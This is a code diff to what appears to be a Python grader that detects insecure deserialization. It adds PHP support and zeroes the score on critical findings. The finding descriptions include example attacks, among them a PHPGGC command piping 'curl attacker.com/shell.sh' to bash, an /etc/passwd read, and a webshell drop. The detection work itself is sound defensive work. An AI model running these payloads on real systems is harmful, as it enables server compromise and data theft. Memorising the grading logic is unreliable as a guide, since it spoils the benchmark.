@@ -34,6 +34,8 @@ class DeserializationDetector:
             return self._analyze_csharp(code)
         elif language in ["cpp", "c"]:
             return self._analyze_cpp(code)
+        elif language == "php":
+            return self._analyze_php(code)
         else:
             return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}
 
@@ -461,6 +463,13 @@ class DeserializationDetector:
                 }
             })
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -744,6 +753,13 @@ class DeserializationDetector:
                 }
             })
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -917,6 +933,13 @@ class DeserializationDetector:
                 }
             })
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -1034,6 +1057,13 @@ class DeserializationDetector:
                     }
                 }
             })
+
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
 
         return {
             "score": self.score,
@@ -1181,6 +1211,13 @@ class DeserializationDetector:
                     }
                 }
             })
+
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
 
         return {
             "score": self.score,
@@ -1379,6 +1416,13 @@ class DeserializationDetector:
                 }
             })
 
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
         return {
             "score": self.score,
             "vulnerabilities": self.vulnerabilities,
@@ -1571,6 +1615,180 @@ class DeserializationDetector:
                         }
                     }
                 })
+
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+
+            self.score = 0
+
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_php(self, code: str) -> Dict:
+        """Analyze PHP code for insecure deserialization."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Pattern 1: unserialize() on user-controlled data
+        unserialize_locations = find_pattern_locations(code, r'unserialize\(')
+
+        if unserialize_locations:
+            # Check if data source is user-controlled
+            has_user_data = any([
+                re.search(r'unserialize\([^)]*\$_(GET|POST|REQUEST|COOKIE)', code),
+                re.search(r'unserialize\([^)]*base64_decode\(\$_(GET|POST|REQUEST)', code),
+                re.search(r'\$\w+\s*=\s*\$_(GET|POST|REQUEST|COOKIE)', code) and re.search(r'unserialize\(\$\w+\)', code),
+            ])
+
+            # Check for validation/signature or allowed_classes whitelist
+            has_validation = any([
+                re.search(r'hash_hmac|hash_equals|openssl_verify', code),
+                re.search(r'if\s*\([^)]*hash_hmac', code),
+                re.search(r'if\s*\([^)]*signature', code, re.IGNORECASE),
+                re.search(r'unserialize\([^)]*,\s*\[\s*["\']allowed_classes["\']', code),  # allowed_classes parameter
+                re.search(r'\[\'allowed_classes\'\]\s*=>\s*\[', code),  # ['allowed_classes'] => [...]
+            ])
+
+            location = unserialize_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            if not has_validation:
+                if has_user_data:
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_DESERIALIZATION",
+                        "severity": "CRITICAL",
+                        "description": "PHP unserialize() on user-controlled data - REMOTE CODE EXECUTION: PHP unserialize() can instantiate arbitrary classes and trigger __wakeup/__destruct magic methods. ATTACK: Attacker crafts malicious serialized object with gadget chain (e.g., Monolog, Guzzle, Laravel classes) that executes code during unserialize(). REAL-WORLD: CVE-2017-9841 (PHPMailer), CVE-2018-20148 (WordPress), CVE-2019-11043 (PHP-FPM) used PHP unserialize RCE. IMPACT: Complete server compromise, database access, file system manipulation, reverse shell.",
+                        "recommendation": "NEVER use unserialize() on untrusted data. Solutions: (1) Use JSON instead: $data = json_decode($input, true), (2) If you MUST unserialize: Use allowed_classes option (PHP 7.0+): $data = unserialize($input, ['allowed_classes' => [MyClass::class]]), (3) Sign serialized data with HMAC: $serialized = serialize($data); $signature = hash_hmac('sha256', $serialized, $secret); // Send both. On receive: if (!hash_equals($signature, hash_hmac('sha256', $serialized, $secret))) die();",
+                        "example_attack": "Attacker sends: O:8:\"Exploiter\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} → unserialize() instantiates Exploiter class → __wakeup() reads /etc/passwd → sends to attacker. OR: Uses PHPGGC tool to generate gadget chain: phpggc Laravel/RCE1 system 'curl attacker.com/shell.sh | bash' → sends serialized payload → unserialize() → RCE.",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "unserialize() called on user-controlled data ($ GET/POST/COOKIE)",
+                                "No HMAC signature verification before unserialization",
+                                "No allowed_classes restriction",
+                                "PHP classes with magic methods (__wakeup, __destruct) in codebase create gadget opportunities"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: unserialize() processes data from $_GET/$_POST/$_REQUEST/$_COOKIE",
+                                "User controls serialized data structure and class instantiation",
+                                "PHP automatically calls __wakeup() and __destruct() during unserialize()",
+                                "Attacker can chain magic methods to achieve RCE (gadget chains)",
+                                "No signature verification - cannot distinguish legitimate data from attacker payloads",
+                                "REAL-WORLD: Laravel, Symfony, WordPress, Drupal all had unserialize() gadget chains"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "unserialize() with $_GET/$_POST/$_REQUEST/$_COOKIE",
+                                "HMAC signature verification (hash_hmac, hash_equals)",
+                                "allowed_classes parameter usage",
+                                "Safe alternatives (json_decode)"
+                            ],
+                            "evidence": {
+                                "found_patterns": ["unserialize() with user-controlled data"],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 0
+                else:
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_DESERIALIZATION",
+                        "severity": "HIGH",
+                        "description": "PHP unserialize() without signature verification - CODE EXECUTION RISK: Even if data source appears internal, attacker can modify serialized data if they gain file/database/cache access. ATTACK SCENARIO: (1) App stores user session in file: /tmp/sess_abc123, (2) Attacker modifies file with malicious serialized object, (3) App reads and unserialize() → RCE. VULNERABLE EVEN IF: data isn't from HTTP request, attacker just needs storage access (shared hosting, stolen backup, Redis access).",
+                        "recommendation": "Replace unserialize() with JSON: $data = json_decode($input, true). If you MUST use serialize/unserialize: Sign the data: $serialized = serialize($data); $signature = hash_hmac('sha256', $serialized, SECRET_KEY); // Store both. On load: if (!hash_equals($expected_sig, hash_hmac('sha256', $serialized, SECRET_KEY))) die('Tampered'); $data = unserialize($serialized);",
+                        "example_attack": "Attacker gains Redis access → modifies cached serialized session → next read calls unserialize() → __wakeup() executes → file_put_contents('/var/www/shell.php', $backdoor) → webshell installed",
+                        "line_number": line_num,
+                        "code_snippet": code_snippet,
+                        "detection_reasoning": {
+                            "criteria_for_vulnerability": [
+                                "unserialize() used without HMAC signature verification",
+                                "No user-controlled data detected, but serialized data could be tampered with",
+                                "Attacker with storage access (file system, database, cache) can inject malicious objects",
+                                "Missing cryptographic integrity protection"
+                            ],
+                            "why_vulnerable": [
+                                f"Line {line_num}: unserialize() without signature verification",
+                                "Even if data source appears trusted, attacker can modify serialized data in storage",
+                                "ATTACK SCENARIOS: shared hosting, Redis compromise, database injection, stolen backups",
+                                "unserialize() automatically calls __wakeup() and __destruct() magic methods",
+                                "No HMAC check - application cannot detect if serialized data was tampered with"
+                            ],
+                            "why_not_vulnerable": [],
+                            "patterns_checked": [
+                                "unserialize() usage patterns",
+                                "HMAC verification (hash_hmac, hash_equals, openssl_verify)",
+                                "Signature checking before unserialize()",
+                                "Safe alternatives (json_decode)"
+                            ],
+                            "evidence": {
+                                "found_patterns": ["unserialize() without signature verification"],
+                                "line_numbers": [line_num],
+                                "code_snippets": [code_snippet]
+                            }
+                        }
+                    })
+                    self.score = 0
+
+        # Pattern 2: Check for safe JSON usage
+        uses_json = any([
+            re.search(r'json_encode\(', code),
+            re.search(r'json_decode\(', code),
+        ])
+
+        if uses_json and not unserialize_locations:
+            json_locations = find_pattern_locations(code, r'json_decode\(')
+            if json_locations:
+                location = json_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                self.vulnerabilities.append({
+                    "type": "SECURE",
+                    "severity": "INFO",
+                    "description": "SECURE: Uses json_decode() instead of unserialize(). JSON is data-only format, cannot represent PHP objects or execute code. This is the recommended way to handle data serialization in PHP.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "unserialize() on untrusted data (gadget chain RCE)",
+                            "No signature verification",
+                            "No allowed_classes restriction",
+                            "Magic method exploitation (__wakeup, __destruct)"
+                        ],
+                        "why_vulnerable": [],
+                        "why_not_vulnerable": [
+                            f"Line {line_num}: Uses json_decode() for deserialization",
+                            "JSON format only supports data primitives (object, array, string, number, boolean, null)",
+                            "Cannot represent PHP objects or class instances",
+                            "No __wakeup() or __destruct() magic methods triggered",
+                            "Safe against gadget chain attacks that exploit unserialize()",
+                            "No unserialize() usage detected in code"
+                        ],
+                        "patterns_checked": [
+                            "unserialize() usage",
+                            "json_decode() usage (safe)",
+                            "HMAC signature patterns",
+                            "allowed_classes parameter"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["json_decode() usage"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+
+        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
+        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
+            self.score = 0
 
         return {
             "score": self.score,
